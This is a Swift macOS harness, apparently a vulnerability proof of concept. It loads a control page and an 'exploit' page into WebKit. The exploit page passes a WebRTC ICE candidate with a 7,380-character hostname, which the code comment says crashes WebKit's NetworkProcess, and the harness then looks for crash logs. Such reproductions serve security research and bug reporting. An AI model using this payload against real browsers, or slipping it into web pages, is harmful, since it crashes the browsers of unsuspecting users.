import AppKit
import WebKit

let CONTROL_HTML = """
<!DOCTYPE html><html><body><div id="result">PENDING</div><script>
async function run() {
    try {
        const pc1 = new RTCPeerConnection({iceServers:[]});
        const pc2 = new RTCPeerConnection({iceServers:[]});
        pc1.addTransceiver('audio');
        const offer = await pc1.createOffer();
        await pc1.setLocalDescription(offer);
        await pc2.setRemoteDescription(offer);
        const answer = await pc2.createAnswer();
        await pc2.setLocalDescription(answer);
        await pc1.setRemoteDescription(answer);
        // Now remote description is set — addIceCandidate is valid
        await pc1.addIceCandidate({
            candidate: "candidate:1 1 UDP 1 valid.host.example 9999 typ host",
            sdpMid: "audio"
        }).then(() => 'ok').catch(e => e.toString());
        document.getElementById('result').textContent = 'CONTROL_PASS';
        window.webkit.messageHandlers.result.postMessage('CONTROL_PASS');
    } catch(e) {
        window.webkit.messageHandlers.result.postMessage('CONTROL_ERROR:' + e);
    }
}
window.addEventListener('load', run);
</script></body></html>
"""

let EXPLOIT_HTML = """
<!DOCTYPE html><html><body><div id="result">PENDING</div><script>
async function run() {
    try {
        const pc1 = new RTCPeerConnection({iceServers:[]});
        const pc2 = new RTCPeerConnection({iceServers:[]});
        pc1.addTransceiver('audio');
        const offer = await pc1.createOffer();
        await pc1.setLocalDescription(offer);
        await pc2.setRemoteDescription(offer);
        const answer = await pc2.createAnswer();
        await pc2.setLocalDescription(answer);
        await pc1.setRemoteDescription(answer);
        // Now trigger: overlong hostname → NetworkProcess crash
        const longHostname = 'A'.repeat(7380);
        const r = await pc1.addIceCandidate({
            candidate: 'candidate:1 1 UDP 1 ' + longHostname + ' 9999 typ host',
            sdpMid: "audio"
        }).then(() => 'RESOLVED').catch(e => 'REJECTED:' + e);
        window.webkit.messageHandlers.result.postMessage(r);
    } catch(e) {
        window.webkit.messageHandlers.result.postMessage('ERROR:' + e);
    }
}
window.addEventListener('load', run);
</script></body></html>
"""

class PhaseB: NSObject, NSApplicationDelegate, WKNavigationDelegate, WKScriptMessageHandler {
    var windows:[NSWindow]=[]
    var webViews:[WKWebView]=[]
    var phase="control"

    func applicationDidFinishLaunching(_ n:Notification) {
        print("=== Phase B: WebRTC overlong hostname ===")
        print("macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)")
        runControl()
    }

    func makeWebView()->WKWebView {
        let config=WKWebViewConfiguration()
        config.userContentController.add(self,name:"result")
        config.preferences.setValue(true,forKey:"peerConnectionEnabled")
        let wv=WKWebView(frame:NSRect(x:0,y:0,width:800,height:600),configuration:config)
        wv.navigationDelegate=self
        let win=NSWindow(contentRect:NSRect(x:0,y:0,width:800,height:600),
            styleMask:[.titled],backing:.buffered,defer:false)
        win.contentView=wv; windows.append(win); webViews.append(wv); return wv
    }

    func runControl() {
        phase="control"
        print("\n--- CONTROL: two-peer negotiation + short hostname ---")
        makeWebView().loadHTMLString(CONTROL_HTML,baseURL:URL(string:"https://localhost")!)
        DispatchQueue.main.asyncAfter(deadline:.now()+20){
            if self.phase=="control" { print("CONTROL: timeout"); self.runExploit() }
        }
    }

    func runExploit() {
        phase="exploit"
        print("\n--- EXPLOIT: two-peer negotiation + hostname A×7380 ---")
        makeWebView().loadHTMLString(EXPLOIT_HTML,baseURL:URL(string:"https://localhost")!)
        DispatchQueue.main.asyncAfter(deadline:.now()+20){
            if self.phase=="exploit" {
                print("EXPLOIT: timeout — no crash, no Promise")
                self.finish()
            }
        }
    }

    func finish() {
        let crashDir=(NSString(string:"~/Library/Logs/DiagnosticReports")).expandingTildeInPath
        let files=(try? FileManager.default.contentsOfDirectory(atPath:crashDir)) ?? []
        let crashes=files.filter{$0.hasSuffix(".crash")||$0.hasSuffix(".ips")}
        if crashes.isEmpty { print("No crash logs") }
        else { crashes.prefix(2).forEach{ print("CRASH: \($0)") } }
        print("\n=== Phase B done ==="); exit(0)
    }

    func userContentController(_ c:WKUserContentController,didReceive msg:WKScriptMessage) {
        let r=msg.body as? String ?? "?"
        print("Promise result: \(r)")
        if phase=="control" { runExploit() }
        else { finish() }
    }

    func webView(_ wv:WKWebView,didFail n:WKNavigation!,withError e:Error){print("err:\(e.localizedDescription)")}
}

let app=NSApplication.shared
let d=PhaseB(); app.delegate=d; app.run()
